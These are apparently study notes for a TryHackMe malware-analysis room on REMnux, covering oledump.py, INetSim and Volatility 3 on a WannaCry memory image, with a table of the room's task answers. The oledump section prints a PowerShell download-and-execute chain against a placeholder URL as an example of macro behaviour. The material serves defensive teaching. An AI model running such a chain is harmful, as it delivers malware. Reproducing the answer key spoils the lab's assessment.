| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Category** | Defensive Security Tooling / Malware Analysis |
| **Difficulty** | Beginner / Intermediate |
| **Time** | ~60 Minutes |
| **Module** | Defensive Security Tooling |

---

## Objective

**REMnux** is a specialised Linux distribution built for **malware analysis and reverse engineering**. Instead of manually installing and configuring dozens of tools, REMnux ships a ready-to-use analysis workstation with everything an analyst needs in one place. This room introduces malware analysis end to end on REMnux: what the distribution is and why a dedicated analysis VM matters, the difference between **static** and **dynamic** analysis, inspecting malicious Office documents with **oledump.py** and VBA macros, simulating a fake Internet with **INetSim**, and investigating a memory image with **Volatility 3** and **strings**.

By the end of this room you will be able to:

- Explain what **REMnux** is and why analysts use a dedicated, isolated analysis VM
- List the core tools bundled with REMnux — **Volatility, YARA, Wireshark, oledump.py, INetSim, CyberChef**
- Distinguish **static analysis** (examine without running) from **dynamic analysis** (observe while running)
- Analyse a malicious Office document with **oledump.py** — list streams (`-s`), extract and decompress VBA macros (`--vbadecompress`)
- Recognise malicious VBA behaviour and extract **IOCs** (`Invoke-WebRequest`, `Start-Process`, URLs, dropped `.exe`)
- Simulate Internet services with **INetSim** and read its connection reports under `/var/log/inetsim/report/`
- Run the core **Volatility 3** plugins — `pslist`, `pstree`, `cmdline`, `filescan`, `dlllist`, `psscan`, `malfind`
- Extract ASCII and 16-bit **little/big-endian** strings from memory and pivot with `grep`

> **Analyst mindset:** a capability, a suspicious memory region, or a string found in memory is a **lead, not proof**. Correlate multiple sources before concluding — *suspicious ≠ malicious*.

---

## What Is Malware Analysis?

**Malware analysis** is the process of examining suspicious or malicious software to understand what it does, how it executes, what files it creates, what processes it starts, what network connections it makes, and what **indicators of compromise (IOCs)** it leaves behind.

It is difficult because results must be accurate, evidence must be handled carefully, and malware may behave differently across environments or actively try to detect analysis tools. Running malware on a normal system is dangerous — so analysts use **isolated analysis environments** such as dedicated virtual machines.

---

## What Is REMnux?

**REMnux** is a Linux distribution designed for malware analysis and reverse engineering. Rather than building an environment by hand, REMnux provides a ready-made malware-analysis workstation.

`Normal Linux → install tools manually → configure dependencies → configure environment` versus `REMnux → malware-analysis + forensics + network + memory + reverse-engineering tools already bundled`.

### Tools included in REMnux

| Tool | Used for |
|---|---|
| **Volatility** | Memory forensics — analysing memory images, processes, DLLs/modules |
| **YARA** | Pattern-matching to identify and classify malware |
| **Wireshark** | Network packet capture and analysis |
| **oledump.py** | Analysing OLE2 / Office documents and embedded VBA macros |
| **INetSim** | Simulating Internet services (a fake network) |
| **CyberChef** | Decoding, deobfuscating and transforming data |

> **Why a dedicated analysis VM?** It isolates dangerous samples from real systems, bundles the right tools, can be snapshotted/reverted, and keeps evidence handling controlled.

---

## Machine Access & Basic Linux Commands

Analysts work from the REMnux terminal. The essential navigation commands used throughout the room:

```bash
$ pwd
$ ls
$ cd <directory>
$ cat <file>
$ sudo <command>
```

`pwd` prints the working directory, `ls` lists files, `cd` changes directory, `cat` reads a file, and `sudo` runs a command with elevated privileges.

---

## Static vs Dynamic Analysis

The two complementary approaches to examining a sample:

| Approach | What it means | Key idea |
|---|---|---|
| **Static Analysis** | Examine the file **without executing** it | Safe; inspect structure, strings, macros, code |
| **Dynamic Analysis** | **Execute** the sample and observe its behaviour | Reveals runtime actions — files, processes, network |

> **Memory trick:** `Static = STudy (don't run)` · `Dynamic = DO (run and watch)`. A full investigation usually combines both — static findings guide what to watch for dynamically.

```text
    ┌───────────────────────────┐
    │       Suspicious File     │
    └─────────────┬─────────────┘
                  │
          ┌───────┴────────┐
          │                │
          v                v
    STATIC ANALYSIS    DYNAMIC ANALYSIS
          │                │
          v                v
    What is inside?   What does it do?
          │                │
          └───────┬────────┘
                  v
           Combine Evidence
                  |
                  v
           Understand Malware
                  |
                  v
            Extract IOCs
```

### Important terms

| Term | Meaning |
|---|---|
| **Malware** | Malicious software designed to harm or compromise a system |
| **Malware Analysis** | Examining malware to understand its behaviour and impact |
| **IOC** | Indicator of Compromise — evidence such as a hash, IP, domain, URL, filename or registry key |
| **Static Analysis** | Analysing a file without running it |
| **Dynamic Analysis** | Analysing a file by running it and observing behaviour |
| **Memory Image** | A captured snapshot of a system's RAM for offline analysis |

---

## File Analysis with oledump.py

Malicious **Office documents** are a common initial-access vector: they use the **OLE2 / Compound File** format and can embed **VBA macros** that execute when the document is opened. **oledump.py** inspects these documents and extracts the embedded content.

List the streams inside a document, then select and decompress the VBA macro stream:

```bash
$ oledump.py suspicious.doc
$ oledump.py -s 3 suspicious.doc
$ oledump.py --vbadecompress suspicious.doc
```

`oledump.py <file>` lists the streams (look for the ones flagged as containing macros), `-s <stream_number>` selects a specific stream, and `--vbadecompress` decompresses the VBA source so it can be read.

> **Analyst mindset:** a document containing a macro is not automatically malicious — but auto-executing macros that download and run files are a strong red flag.

### Suspicious VBA behaviour → IOCs

Malicious VBA frequently launches **PowerShell** to download and execute a payload. The two commands to recognise:

```powershell
Invoke-WebRequest -Uri "https://example.com/payload.exe" -OutFile "C:\Temp\payload.exe"
Start-Process "C:\Temp\payload.exe"
```

- `Invoke-WebRequest` downloads a file; `-Uri` is the source URL and `-OutFile` is the local save path.
- `Start-Process` executes the downloaded file.

The attack chain and the IOCs it yields:

`VBA macro → PowerShell Invoke-WebRequest (download) → Start-Process (execute) → dropped .exe`

The room's sample drops `doc-3737122PDF.EXE` — a filename masquerading as a PDF, an **IOC candidate** to record alongside the download URL and any temporary paths.

> **Obfuscation vs encoding:** **encoding** (e.g. Base64) is a reversible representation with no secrecy; **obfuscation** deliberately hides intent to slow analysis. CyberChef helps reverse both — but decoding a string only reveals *what it is*, not that it *executed*.

---

## Network Simulation with INetSim

**INetSim** (Internet Services Simulation Suite) provides a controlled **fake network**: it emulates Internet services (HTTP, HTTPS, DNS and more) so that when malware tries to "phone home" or download a payload, the request is answered by the simulator and recorded — without giving the sample real Internet access.

```text
                    Malware
                       |
                       v
                Network Request
                       |
                       v
                    INetSim
                       |
          ┌────────────┼────────────┐
          v            v            v
         DNS          HTTP       Other
          |            |         Services
          └────────────┼────────────┘
                       v
                 Simulated Reply
```

INetSim records connections while running, and writes a report per session. Fetch a file through the fake network and read the resulting report:

```bash
# Download a file
wget <URL>

# Download HTTPS file without certificate verification
wget https://<IP>/<FILE> --no-check-certificate

# Example from the room
sudo wget https://10.49.152.158/flag.txt \
    --no-check-certificate

# List INetSim reports
sudo ls -lah /var/log/inetsim/report/

# Read a report
sudo cat /var/log/inetsim/report/report.<PID>.txt
```

For example, the room reads `/var/log/inetsim/report/report.2594.txt`. The report captures the connections the sample attempted, turning network behaviour into concrete evidence.

> **Memory trick:** `INetSim = Internet Simulation` — a fake Internet that answers and logs the malware's requests safely.

---

## Memory Forensics with Volatility 3

**Volatility 3** analyses a **memory image** (a snapshot of RAM). Memory holds volatile evidence that never touches disk — running processes, command lines, loaded DLLs, injected code and network artifacts. The room analyses the WannaCry image **`wcry.mem`**.

Basic syntax (the launcher may be `vol3` or `python3 vol.py`):

```bash
$ python3 vol.py -f <memory_image> <plugin>
$ vol3 -f wcry.mem windows.pslist.PsList
```

The core Volatility 3 plugins at a glance:

```text
┌────────────────────────────────────────────────────────────┐
│                     VOLATILITY 3                           │
├────────────────────────────────────────────────────────────┤
│ PsList      → Process listing                              │
│ PsTree      → Parent/child process hierarchy               │
│ CmdLine     → Command-line arguments                       │
│ FileScan    → File objects                                 │
│ DllList     → Loaded DLLs                                  │
│ PsScan      → Process structure scanning                   │
│ Malfind     → Suspicious memory regions                    │
└────────────────────────────────────────────────────────────┘
```

The memory-forensics workflow chains the plugins from a memory image to deeper investigation:

```text
                 MEMORY IMAGE
                      |
                      v
                Volatility 3
                      |
          ┌───────────┼───────────┐
          v           v           v
       PsList      PsTree      CmdLine
          |           |           |
          v           v           v
      Processes    Relations    Commands
          |           |           |
          └───────────┼───────────┘
                      |
                      v
                  FileScan
                      |
                      v
                File Evidence
                      |
                      v
              Deeper Investigation
```

### Core plugins

> **1. windows.pslist.PsList**
> Lists all currently active processes in the memory image. *"What processes are listed?"*

> **2. windows.pstree.PsTree**
> Lists processes in a tree based on parent process ID (PPID), showing parent-child relationships. *"How are those processes related?"*

> **3. windows.cmdline.CmdLine**
> Shows the command-line arguments each process was started with — often the clearest sign of malicious execution.

> **4. windows.filescan.FileScan**
> Scans memory for file objects, revealing files referenced in memory (including suspicious artifacts).

> **5. windows.dlllist.DllList**
> Lists the DLLs/modules loaded by each process, along with their file paths.

> **6. windows.psscan.PsScan**
> Scans memory structures for processes — can reveal hidden or terminated processes that `PsList` misses.

> **7. windows.malfind.Malfind**
> Identifies memory regions with characteristics of injected or suspicious code (e.g. executable+writable private memory).

> **PsList vs PsScan:** `PsList` walks the active process list (what the OS reports); `PsScan` scans memory for process structures directly, so it can surface **hidden/unlinked** processes. `Malfind` result ≠ automatic proof of malware — investigate the process, PID, memory address, protection, bytes and parent before concluding.

### Extracting strings from memory

The `strings` utility pulls printable text from the raw image. Windows commonly stores text as **UTF-16LE**, so extract all three encodings:

```bash
# ASCII strings
strings wcry.mem

# 16-bit little-endian (Windows Unicode)
strings -e l wcry.mem

# 16-bit big-endian
strings -e b wcry.mem
```

`-e l` extracts 16-bit little-endian and `-e b` extracts 16-bit big-endian strings. Save output to a file (`strings wcry.mem > strings.txt`) so it can be searched. Remember: **a string found ≠ execution confirmed** — it must be correlated.

```text
             MEMORY IMAGE
                  |
                  v
               strings
                  |
       ┌──────────┼──────────┐
       v          v          v
     ASCII      UTF-16LE   UTF-16BE
       |          |          |
       └──────────┼──────────┘
                  v
             Readable Data
                  |
                  v
          Search for Indicators
                  |
          ┌───────┼────────┐
          v       v        v
         URL      IP      Filename
```

### Evidence preprocessing with grep

Volatility and `strings` produce large output, so pivot with `grep` to filter down to the answer:

```bash
$ grep -i "WanaDecryptor" strings.txt
$ grep -i "powershell" cmdline.txt
$ vol3 -f wcry.mem windows.dlllist.DllList | grep -i "WanaDecryptor"
$ grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' strings.txt
$ grep -Eoi 'https?://[^[:space:]]+' strings.txt
$ grep -Eio '[^[:space:]]+\.(exe|dll|ps1|bat|vbs|js|zip)' strings.txt
```

`-i` is case-insensitive, `-R` is recursive, and `-Eo`/`-Eoi` print only the matching regex (IPs, URLs, file names) — turning a memory image into a list of IOCs.

---

## Command Cheat Sheet

Run every Volatility plugin against the image, then extract strings:

```bash
# Process list
python3 vol.py -f memory.raw windows.pslist.PsList

# Process tree
python3 vol.py -f memory.raw windows.pstree.PsTree

# Command lines
python3 vol.py -f memory.raw windows.cmdline.CmdLine

# File scan
python3 vol.py -f memory.raw windows.filescan.FileScan

# DLL list
python3 vol.py -f memory.raw windows.dlllist.DllList

# Process scan
python3 vol.py -f memory.raw windows.psscan.PsScan

# Suspicious memory
python3 vol.py -f memory.raw windows.malfind.Malfind

# ASCII strings
strings memory.raw
```

> The exact memory-image filename and Volatility launcher may differ in the lab.

---

## TryHackMe Task Answers

| Question | Answer |
|---|---|
| **Which plugin lists processes in a tree based on their parent process ID?** | PsTree (`windows.pstree.PsTree`) |
| **Which plugin is used to list all currently active processes in the machine?** | PsList (`windows.pslist.PsList`) |
| **Which Linux utility can extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings?** | `strings` |
| **Running vol3 with Malfind, what is the 1st process suspected of having injected code?** | `csrss.exe` |
| **Continuing, what is the 2nd process suspected of having injected code?** | `winlogon.exe` |
| **Using DllList, what is the file path/directory of the binary `@WanaDecryptor@.exe`?** | `C:Intelivecuqmanpnirkt615` |

> **Content flag:** the DllList path answer is reproduced exactly as the source notes render it — `C:Intelivecuqmanpnirkt615`. The source appears to have stripped the backslashes from the original Windows path (`C:\Intel\...`); no characters were invented or added.

---

## Quick Revision

| Topic | Key fact |
|-------|----------|
| **REMnux** | A Linux distro pre-loaded with malware-analysis, forensics, network and memory tools. |
| **Static vs Dynamic** | Static = examine without running; Dynamic = run and observe. |
| **oledump.py** | `oledump.py file` lists streams; `-s N` selects a stream; `--vbadecompress` decompresses VBA. |
| **VBA IOCs** | `Invoke-WebRequest -Uri … -OutFile …` downloads; `Start-Process` executes; dropped `doc-3737122PDF.EXE`. |
| **INetSim** | Fake Internet; `wget … --no-check-certificate`; reports in `/var/log/inetsim/report/`. |
| **Volatility 3** | `vol3 -f wcry.mem windows.<plugin>` — pslist, pstree, cmdline, filescan, dlllist, psscan, malfind. |
| **PsList vs PsScan** | PsList = active list; PsScan = scan memory (finds hidden processes). |
| **Malfind** | Flags injected/suspicious memory; room finds `csrss.exe` then `winlogon.exe`. |
| **strings** | `strings` (ASCII), `-e l` (UTF-16LE), `-e b` (UTF-16BE); save then `grep`. |
| **Golden rule** | A capability/string/memory hit is a lead — correlate before concluding. |

---

## Interview Questions

| Question | Answer |
|---|---|
| **Q1. What is REMnux?** | A Linux distribution designed for malware analysis and reverse engineering that bundles many analysis tools in one ready-to-use environment. |
| **Q2. Why use a dedicated analysis VM?** | To isolate dangerous samples from real systems, provide the right tools together, and allow snapshot/revert and controlled evidence handling. |
| **Q3. What is the difference between static and dynamic analysis?** | Static analysis examines a file without executing it; dynamic analysis runs the sample and observes its behaviour. |
| **Q4. What does oledump.py do?** | It analyses OLE2/Office documents, lists their streams, and can extract and decompress embedded VBA macros. |
| **Q5. What is INetSim?** | A network service simulation suite that emulates Internet services so malware's network behaviour can be observed safely and recorded. |
| **Q6. Which Volatility plugin reveals parent-child process relationships?** | `windows.pstree.PsTree`. |
| **Q7. What does Malfind detect?** | Memory regions exhibiting characteristics of injected or suspicious code — a lead requiring further investigation, not proof of malware. |
| **Q8. How do you extract Windows Unicode strings from memory?** | With `strings -e l` (16-bit little-endian), since Windows commonly uses UTF-16LE. |

## Final Takeaway

**REMnux** turns a mountain of setup into a ready malware-analysis workstation. The discipline the room teaches is a workflow, not a tool list: decide **which tool answers which question**. Use **static analysis** to safely dissect a sample — **oledump.py** to list streams (`-s`) and decompress **VBA** (`--vbadecompress`), surfacing IOCs like the `Invoke-WebRequest`/`Start-Process` download-and-run chain and the dropped `doc-3737122PDF.EXE`. Use **dynamic analysis** with **INetSim** to answer network calls on a fake Internet and capture reports under `/var/log/inetsim/report/`. Use **memory forensics** with **Volatility 3** — `pslist`, `pstree`, `cmdline`, `filescan`, `dlllist`, `psscan`, `malfind` — to reconstruct what ran (the `wcry.mem` image reveals injected code in `csrss.exe` and `winlogon.exe`), and pull **strings** (`-e l` / `-e b`) piped through **grep** to extract concrete IOCs. Throughout, the same rule holds: a capability, a string, or a Malfind hit is a **lead** — build a timeline, **correlate** multiple sources, then conclude.

---
*Room notes authored for the Cyber Security 101 Defensive Security Tooling module — REMnux: Getting Started.*
